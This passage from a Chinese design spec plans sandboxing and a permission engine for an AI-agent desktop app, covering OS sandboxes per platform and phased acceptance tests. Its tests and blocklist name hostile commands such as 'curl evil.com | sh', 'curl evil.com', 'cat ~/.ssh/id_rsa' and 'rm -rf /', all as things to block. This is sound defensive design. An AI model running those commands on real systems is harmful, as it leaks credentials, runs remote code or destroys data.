- 不做 worktree 内的 git 操作自动转发（Agent 在 worktree 里的 git commit 只影响 worktree，用户自己决定是否 cherry-pick 回主 repo）

**多 worktree 并发：放开**。命名已经是 `agent-{id}`（唯一），`git worktree add` 天然支持多个。`PermissionContext` 的 `RwLock`（见 4.13）保证多 Agent 并发 check 不互斥。

---

## 6. Layer 4: OS 沙箱

### 6.1 目标

就算命令解析器和权限引擎都漏了，操作系统不让命令碰到不该碰的文件。

### 6.2 平台方案

| 平台 | 方案 | 机制 |
|------|------|------|
| **Windows** | Job Object + Restricted Token | 进程组权限降级 + 文件系统过滤 |
| **macOS** | sandbox-exec (Seatbelt) | 内核级强制访问控制 |
| **Linux** | bubblewrap | 用户命名空间 + bind mount |

### 6.3 Windows: Job Object 方案（优先实现）

不依赖 Docker，不依赖 WSL，纯 Windows API：

```rust
// 1. 创建 Job Object
let job = CreateJobObjectW(None, None)?;

// 2. 设置限制 —— 用 die-with-parent + breakaway，不设 ActiveProcessLimit
let mut limits: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = zeroed();
limits.BasicLimitInformation.LimitFlags = JOBOBJECT_LIMIT_DIE_ON_JOB_CLOSE
                                       | JOBOBJECT_LIMIT_BREAKAWAY_OK;
//                     ↑ 主进程退出时杀掉整个 Job（防孤儿子进程）
//                     ↑                  ↑ 允许子进程脱离 Job 创建孙进程
//                       (不设 ActiveProcessLimit=1，否则 bash 管道/fork 全挂)
SetInformationJobObject(job, JobObjectExtendedLimitInformation, &limits, size)?;

// 3. 把子进程塞进 Job（必须在子进程 resume 前调用，用 CREATE_SUSPENDED）
AssignProcessToJobObject(job, child_process_handle)?;
ResumeThread(child_thread_handle)?;
```

**Job Object 能做什么、不能做什么**（诚实清单）：
- ✅ 主进程崩溃时杀掉所有子孙进程（防孤儿）
- ✅ 限制 CPU/内存/IO 配额（可选）
- ❌ **不防读敏感文件**——`cat ~/.ssh/id_rsa` 照常执行
- ❌ **不防网络外泄**——`curl evil.com` 照常执行
- ❌ **不防 fork 逃逸**（设了 `BREAKAWAY_OK` 才能跑正常管道，但这也意味着子进程能脱离 Job）

结论：**Job Object 单独不是 OS 沙箱**，只是进程生命周期管理。spec 1.2 列的"读敏感文件"和"网络外泄"两个缺口，Job Object 一个都没堵。

**文件系统/网络隔离**在 Windows 上有几种选择：
- **AppContainer**（Windows 8+）：最完整，capability-based 文件系统和网络隔离。但需要设计 capability 清单 + 处理 AppContainer profile 目录，实现成本高。
- **Restricted Token + Low Integrity**：简单，但只能防写入系统目录（不能防读 `~/.ssh`）
- **MiniFilter Driver**：太重了，不适合桌面应用

**分阶段建议**：
- **Phase 4a**：Job Object（进程限制 + die-with-parent）—— 让 Agent 子进程不变成孤儿，限 CPU/内存。**不号称堵了文件/网络缺口**。
- **Phase 4b**：AppContainer（文件系统 + 网络隔离）—— 真正堵 1.2 的缺口。成本高，放后面。

### 6.4 macOS: sandbox-exec

```rust
// seatbelt profile (类似 Claude Code 的做法)
let profile = format!(r#"
    (version 1)
    (deny default)
    (allow file-read* (subpath "{project_root}"))
    (allow file-write* (subpath "{project_root}"))
    (allow file-write* (subpath "/tmp/hologram-{user}"))
    (allow network-outbound (remote ip "{allowed_domain}"))
    (deny network*)
"#);

// 用 sandbox-exec 包裹命令
let cmd = format!("sandbox-exec -p '{}' -- bash -c '{}'", profile, command);
```

**⚠️ `sandbox-exec` 是 Apple 私有 API**：无官方文档、profile 语法未稳定、macOS 版本升级可能改行为或废弃。Claude Code 用它是别无选择（macOS 上没有其他用户态 sandbox）。我们用它要注明风险：
- 不要把 profile 语法当成稳定契约——每个 macOS 大版本都要回归测试。
- 在 `is_sandbox_available()`（6.6）里加版本检测，已知不兼容的 macOS 版本直接返回 `Unavailable`，退化到权限引擎。
- 长期看 Apple 若废弃 `sandbox-exec`，macOS 方案要换 ENDPOINT SECURITY framework（需要 entitlement，更适合 GUI app）。这是 Phase 5 之后的事，当前不做。

### 6.5 Linux: bubblewrap

```rust
// bubblewrap (Claude Code 同款)
let cmd = format!(
    "bwrap \
     --ro-bind /usr /usr \
     --ro-bind /lib /lib \
     --ro-bind /lib64 /lib64 \
     --ro-bind /bin /bin \
     --bind {project_root} {project_root} \
     --bind /tmp/hologram-{user} /tmp \
     --unshare-net \
     --die-with-parent \
     -- bash -c '{command}'",
);
```

### 6.6 必需的前置检查

```rust
fn is_sandbox_available() -> SandboxStatus {
    match platform {
        Windows => SandboxStatus::Available,  // Job Object 不需要安装
        MacOS => {
            if which("sandbox-exec").is_some() {
                SandboxStatus::Available
            } else {
                SandboxStatus::Unavailable("sandbox-exec not found")
            }
        }
        Linux => {
            if which("bwrap").is_some() {
                SandboxStatus::Available  
            } else {
                SandboxStatus::Unavailable("bubblewrap not installed. Run: apt install bubblewrap")
            }
        }
    }
}
```

### 6.7 退化策略

```rust
fn wrap_with_sandbox(cmd: &str, isolation: IsolationKind) -> Result<String> {
    match is_sandbox_available() {
        SandboxStatus::Available => Ok(wrap_with_os_sandbox(cmd)),
        SandboxStatus::Unavailable(reason) if sandbox_required(isolation) => {
            Err(format!("OS sandbox 不可用但当前隔离级别要求: {reason}"))
        }
        SandboxStatus::Unavailable(reason) => {
            log::warn!("OS sandbox unavailable: {reason}. Falling back to permission engine only.");
            Ok(cmd.to_string())  // 退化到只用权限引擎
        }
    }
}

/// 谁决定 sandbox 是硬性要求？
/// - Worktree 隔离：硬性要求。没 sandbox 的 worktree 等于 Agent 在主 repo 裸奔，
///   worktree 的"杀伤范围限制"承诺失效。→ 必须拒绝执行。
/// - None 隔离：可退化。但 UI 必须显眼标识"OS 沙箱不可用，仅权限引擎保护"，
///   且 System 层 Critical 危险命令仍被权限引擎拦截（见 4.5 第 1 步）。
fn sandbox_required(isolation: IsolationKind) -> bool {
    matches!(isolation, IsolationKind::Worktree)
}
```

**不得提供用户级开关关掉 sandbox_required**——否则退化回 1.1 的漏勺现状。sandbox 是否必需由隔离级别决定，不由用户决定。

### 6.8 不做

- 不做跨平台统一 sandbox-runtime 包（Claude Code 的 `@anthropic-ai/sandbox-runtime` 是 TypeScript npm 包，我们是 Rust，走平台原生 API）
- 不做 macOS App Sandbox（那是 App Store 的 entitlements，我们不是 App Store 应用）
- 不做 Docker 方案（太重了，用户体验差）

---

## 7. 实现路径

### Phase 1: 修漏勺（4-5 天）

**目标**：**所有裸奔工具**不再裸奔——不只 `exec_command`。1.1 表里 9 类裸奔工具全部接入 sandbox 检查。

**改动**：
- `src-tauri/src/sandbox.rs` → 添加 `check_command(&self, command: &str) -> Result<ParsedCommand>`（exec_command 用）
- `src-tauri/src/sandbox.rs` → 添加 `check_read_dir(&self, path: &Path) -> SandboxResult`（list_directory/glob/search_content 用，复用 resolve_read 逻辑但语义独立）
- `exec_command` 在执行前（**包括 `run_in_background` 分支**）调用 `sandbox.check_command()`
- **给所有裸奔工具补 sandbox 调用**（按 4.2 映射表）：
  - `edit_file`：补 `check_read` + `check_write`（先读后写，两道都过）
  - `create_directory`：补 `check_write`
  - `rename_file_or_dir`：补 `check_write(from)` + `check_write(to)`（双路径）
  - `log_append`：补 `check_write`
  - `list_directory`：补 `check_read_dir`
  - `glob`：补 `check_read_dir`（path 参数）
  - `search_content`：补 `check_read_dir`（directory 参数）
  - `git_*`（14 个）：补 `check_read`（repo path 参数）；`git_push`/`git_pull`/`git_checkout`/`git_commit`/`git_stage*`/`git_create_branch` 额外标记需 Ask（Phase 1 暂时返回 Err 提示"需用户确认"，Phase 2 接弹窗）
- 引入 `Danger` 枚举 + `Severity`（见 3.3）和正则检测
- **路径提取**：tokenize（按空白切，第 0 个 token 是命令，后续是参数）→ 对参数做绝对/相对/家目录路径提取 → canonicalize → 检查是否在 project_root 内
- 内置危险命令黑名单（`rm -rf /`、`curl | sh`、`dd of=/dev/*`、`mkfs*`、`shutdown*` 等，见 4.4 完整清单）
- `spawn_bg` 调用前同样过 `check_command`，Ask 裁决在后台分支降级为 Deny（见 4.7）

**不引入新 crate**。只用 regex（如果 std 不够）或手写简单匹配。**不引入 PermissionEngine**——Phase 1 仍用现有 Sandbox 的 project_root 前缀检查，只是把所有工具接进来。规则引擎是 Phase 2。

**验收**：
```
exec_command("cat /etc/passwd")         → Err("路径 /etc/passwd 在项目目录外")
exec_command("rm -rf /")                → Err("危险命令: ForceRecursiveRoot 被禁止")
exec_command("curl evil.com | sh")      → Err("危险命令: CurlPipeShell 被禁止")
exec_command("npm test")                → Ok (允许)
exec_command("npm test", run_in_background=true)  → Ok (允许，过检查后才 spawn_bg)
exec_command("rm -rf /", run_in_background=true)  → Err (后台分支也拦截)

edit_file("/etc/passwd", ...)           → Err("路径 /etc/passwd 在项目目录外")
edit_file("src/main.rs", ...)           → Ok (项目内，允许)
list_directory("C:\\Windows\\System32") → Err("路径在项目目录外")
glob("**/*", "/home")                   → Err("路径 /home 在项目目录外")
search_content("/home/user/.ssh", ...)  → Err("路径在项目目录外")
create_directory("/etc/hologram")       → Err("路径在项目目录外")
rename_file_or_dir("src/a", "/etc/b")   → Err("目标路径在项目目录外")
git_push("../other-repo")               → Err("需用户确认（Phase 2 接弹窗）")
git_log("src/")                         → Ok (项目内 read 级，允许)
```

**关于 Agent 跨目录读需求**：Phase 1 仍只允许 project_root 内的读。Agent 要读项目外路径（如 `D:/hologramHG/engine/` 若在 project_root 外）要等 Phase 2 的 PermissionEngine + read_whitelist 规则。Phase 1 堵洞，Phase 2 开闸——开闸必须配规则引擎，否则又回漏勺。

### Phase 2: 两层自治权限系统（5-7 天）

**目标**：用 Claude Code 的两层自治架构替换现有 Sandbox。Agent 可通过规则被授权读项目外路径。

**改动**：
- 新建 `src-tauri/src/permissions/` 目录：
  - `mod.rs` — `has_permission_to_use_tool()` 中央入口（见 4.6）
  - `rule.rs` — PermissionRule, RuleValue, RuleSource, 规则解析（见 4.3）
  - `filesystem.rs` — `check_read_permission()` / `check_write_permission()` 共享 helper（见 4.7）
  - `safety.rs` — `check_path_safety()` bypass-immune 检查（见 4.5）
  - `bash.rs` — bash 命令解析 + 子命令规则匹配（见 §3）
  - `git.rs` — git 子命令规则
  - `web.rs` — 域名规则 + SSRF
- 新建 `src-tauri/src/tools/` 目录：
  - `mod.rs` — Tool trait 定义（见 4.2）
  - 每个 Tauri command 对应一个 tool 实现，调共享 helper
- `sandbox.rs` **保留但降级**为路径解析层（canonicalize + symlink/junction 检测），被 `permissions/filesystem.rs` 调用，不再独立裁决
- `workspace.rs` 的 `check_read`/`check_write` **删除**——替换为 `has_permission_to_use_tool(tool, input, ctx)`
- `PermissionContext`（RwLock<rules>，见 4.13）替代 WorkspaceHandle 的 sandbox 字段
- `.hologram/permissions.json` 规则加载（见 4.9）
- 前端弹窗：新的 Tauri command `permission_ask_response`；Phase 1 暂时返回 Err 的 git 操作现在走真实弹窗
- 审计集成（见 4.12）：`has_permission_to_use_tool()` 内嵌 audit 调用

**不引入 tree-sitter**——Phase 2 的 bash 解析仍用正则。tree-sitter 是 Phase 2.5 优化。

**验收**：
```
// 用户配置: Bash(npm test:*) allow
exec_command("npm test -- --filter=foo")  → Allow (前缀匹配)
exec_command("npm run build")              → Ask  (无匹配规则)
exec_command("rm -rf /tmp/build")          → Ask  (无匹配规则)

// 用户配置: Edit(*.lock) deny
write_file("Cargo.lock", content)          → Deny

// safetyCheck bypass-immune
edit_file(".git/config", ...)              → Ask (即便用户配了 Edit(.git/**) Allow)

// 跨目录读（Agent 关键需求）
// 用户配置: Read(D:/hologramHG/engine/**) allow
read_file_content("D:/hologramHG/engine/src/main.rs")  → Allow
```

### Phase 3: Agent 隔离（2-3 天）

**目标**：Agent 可以在 worktree 里搞破坏而不影响主 repo。

**改动**：
- 新建 `src-tauri/src/agent_isolation.rs`
- Tool 的 `check_permissions` 支持路径映射（worktree 模式时反向映射回主 repo 路径做规则匹配）
- git worktree 创建/清理/合并流程
- 前端：Agent 启动时可选 `isolation: "worktree"`

**验收**：
```
// Agent 以 worktree 模式启动
agent.run("把所有 pub fn 改成 pub(crate) fn")
// → 在 .hologram/worktrees/agent-abc123/ 内修改文件
// → 主 repo 文件不变
// → 用户确认后合并
```

### Phase 4a: OS 沙箱 — Windows 进程限制（2 天）

**目标**：Windows 上 Agent 子进程被 Job Object 纳管，主进程退出时一并清理。**不号称堵了文件/网络缺口**——那要等 4b。

**改动**：
- `src-tauri/src/os_sandbox.rs` — 平台抽象 trait + Windows 实现
- Windows: `CreateJobObject` + `JOB_OBJECT_LIMIT_DIE_ON_JOB_CLOSE | JOBOBJECT_LIMIT_BREAKAWAY_OK` + `AssignProcessToJobObject`（用 `CREATE_SUSPENDED` 先挂起再 assign 再 resume）
- `exec_command` 在 spawn 前过 OS 沙箱包装

**验收**：
```
// Agent 执行 bash -c 'sleep 1000 &'
// → 主进程被 kill 时，sleep 子进程也被 Job 收走（不留孤儿）
// Agent 执行 bash -c 'ls | grep x'
// → 管道正常工作（BREAKAWAY_OK 允许 fork，不设 ActiveProcessLimit）
// Agent 执行 cat ~/.ssh/id_rsa
// → 仍然能读（Job Object 不防读，由 4b AppContainer 解决）
```

### Phase 4b: OS 沙箱 — Windows 文件系统/网络隔离（4-5 天）

**目标**：真正堵 spec 1.2 的"读敏感文件"和"网络外泄"两个缺口。

**改动**：
- AppContainer profile 设计 + capability 清单（文件系统只读项目目录、网络白名单域名）
- `os_sandbox.rs` Windows 实现扩展：Job Object 内再套 AppContainer
- 退化策略对接（见 6.7）：AppContainer 不可用时按 isolation 级别决定拒绝/退化

**验收**：
```
// Agent 执行 cat ~/.ssh/id_rsa
// → AppContainer 拦截: ReadFile capability denied
// Agent 执行 curl evil.com
// → AppContainer 拦截: Network capability denied (非白名单域名)
// Agent 执行 npm test (需要读 node_modules、写 /tmp)
// → 正常执行（项目目录 + 临时目录在 capability 清单内）
```

### Phase 5: OS 沙箱 — macOS/Linux（2-3 天）

**目标**：macOS 用 sandbox-exec，Linux 用 bubblewrap。

**改动**：
- macOS: `sandbox-exec` profile 生成 + 前置检测
- Linux: `bwrap` 参数生成 + 前置检测
- 退化策略：bwrap 没装 → 警告用户，继续用权限引擎

---

## 8. 不做什么

- **不做 LLM 权限分类器**。Claude Code 用 Haiku 对命令做实时 classify（"这个 curl 命令是下载依赖还是外泄数据？"）。那是优化手段，不是基础架构。规则引擎先跑通。
- **不做权限模式切换**（bypass/plan/auto 模式切换）。先只做一种模式：default-deny-writes, default-allow-reads-in-project。模式切换是 UX 需求。
- **不做远程 Agent 执行**（`isolation: "remote"`）。那是 Claude Code 的 CCR 集成。HoloGram 没有远程执行环境。
- **不做沙箱 violation 的持久化存储**。Claude Code 的 `SandboxViolationStore` 是给 `hologram sandbox violations` 命令用的。YAGNI。
- **不做 per-platform 开启/关闭开关**。Claude Code 的 `enabledPlatforms: ["macos"]` 是企业分批推广用的。HoloGram 还不到那个规模。

---

## 附录 A: 文件清单

| 文件 | 状态 | 内容 |
|------|------|------|
| `src-tauri/src/sandbox.rs` | 保留降级 | 保留路径 canonicalize + symlink/junction 检测。删除 resolve_read/resolve_write 的裁决逻辑，改为纯路径解析。被 permissions/filesystem.rs 调用。 |
| `src-tauri/src/permissions/mod.rs` | 新建 | `has_permission_to_use_tool()` 中央入口（4.6），编排整工具级规则 + 工具自治 + safetyCheck + 模式裁决 |
| `src-tauri/src/permissions/rule.rs` | 新建 | PermissionRule, RuleValue, RuleSource, 规则字符串解析（4.3） |
| `src-tauri/src/permissions/filesystem.rs` | 新建 | `check_read_permission()` / `check_write_permission()` 共享 helper（4.7），用 ignore crate 做 glob 匹配 |
| `src-tauri/src/permissions/safety.rs` | 新建 | `check_path_safety()` bypass-immune 检查（4.5）：.git/.hologram/.ssh/.bashrc 等 |
| `src-tauri/src/permissions/bash.rs` | 新建 | bash 命令解析 + 子命令拆分 + 规则匹配（§3），BashTool 的 check_permissions 调这个 |
| `src-tauri/src/permissions/git.rs` | 新建 | git 子命令规则（push/pull/checkout/commit 等） |
| `src-tauri/src/permissions/web.rs` | 新建 | 域名规则 + SSRF 检查，WebFetchTool 的 check_permissions 调这个 |
| `src-tauri/src/tools/mod.rs` | 新建 | Tool trait 定义（4.2）：name/get_path/is_read_only/check_permissions |
| `src-tauri/src/tools/*.rs` | 新建 | 每个 Tauri command 一个 tool 实现，调 permissions/ 里的共享 helper |
| `src-tauri/src/agent_isolation.rs` | 新建 | git worktree 创建/清理/路径映射（§5） |
| `src-tauri/src/os_sandbox.rs` | 新建 | 平台抽象: Windows JobObject/AppContainer / macOS seatbelt / Linux bwrap（§6） |
| `src-tauri/src/workspace.rs` | 修改 | 删除 check_read/check_write，sandbox 字段换成 PermissionContext。17 个 with_workspace 调用改为走 has_permission_to_use_tool。 |
| `src-tauri/src/main.rs` | 修改 | 每个 #[tauri::command] 走 has_permission_to_use_tool 编排 |
| `src-tauri/src/audit.rs` | 修改 | 扩字段：danger_kind/severity/rule_source/user_choice（4.12） |
| `.hologram/permissions.json` | 新建 | 项目级权限规则（用户可编辑） |

## 附录 B: 关键 API 签名

```rust
// ── Tool trait（4.2）──

trait Tool {
    fn name(&self) -> &str;
    fn get_path(&self, input: &Value) -> Option<PathBuf>;
    fn is_read_only(&self, input: &Value) -> bool;
    fn is_destructive(&self, input: &Value) -> bool;
    fn requires_user_interaction(&self) -> bool;
    fn check_permissions(&self, input: &Value, ctx: &PermissionContext) -> PermissionResult;
}

enum PermissionResult {
    Allow,
    Deny { reason: String },
    Ask { reason: String, suggestions: Vec<PermissionUpdate> },
    Passthrough,
}

// ── 中央入口（4.6）──

fn has_permission_to_use_tool(
    tool: &dyn Tool,
    input: &Value,
    ctx: &PermissionContext,
) -> PermissionDecision;

// ── 共享 helper（4.7）──

fn check_read_permission(tool: &dyn Tool, input: &Value, ctx: &PermissionContext) -> PermissionDecision;
fn check_write_permission(tool: &dyn Tool, input: &Value, ctx: &PermissionContext) -> PermissionDecision;

// ── safetyCheck（4.5）──

fn check_path_safety(path: &Path) -> SafetyCheckResult;

// ── 规则模型（4.3）──

struct PermissionRule { source: RuleSource, behavior: Behavior, value: RuleValue }
struct RuleValue { tool_name: String, content: Option<String> }
enum Behavior { Allow, Deny, Ask }
enum RuleSource { System, Project, User, Session }

// ── PermissionContext（4.13）──

struct PermissionContext {
    rules: RwLock<PermissionRules>,
    mode: RwLock<PermissionMode>,
    working_dirs: RwLock<WorkingDirs>,
}

impl PermissionContext {
    fn new(project_root: &Path) -> Self;
    fn load_rules(&self, source: RuleSource);           // &self：RwLock 内部可变
    fn add_session_rule(&self, rule: PermissionRule);   // 写锁
}

// ── bash 命令解析（§3）──

fn parse_command(command: &str) -> Result<ParsedCommand>;

// ── Agent 隔离（§5）──

struct AgentIsolation { ... }
impl AgentIsolation {
    fn create(kind: IsolationKind, slug: &str) -> Result<Self>;
    fn map_path(&self, path: &Path) -> PathBuf;
    fn cleanup(&self) -> Result<CleanupResult>;
}

// ── OS 沙箱（§6）──

struct OsSandbox;
impl OsSandbox {
    fn available() -> SandboxStatus;
    fn wrap_command(command: &str, config: &SandboxConfig) -> Result<String>;
}
```
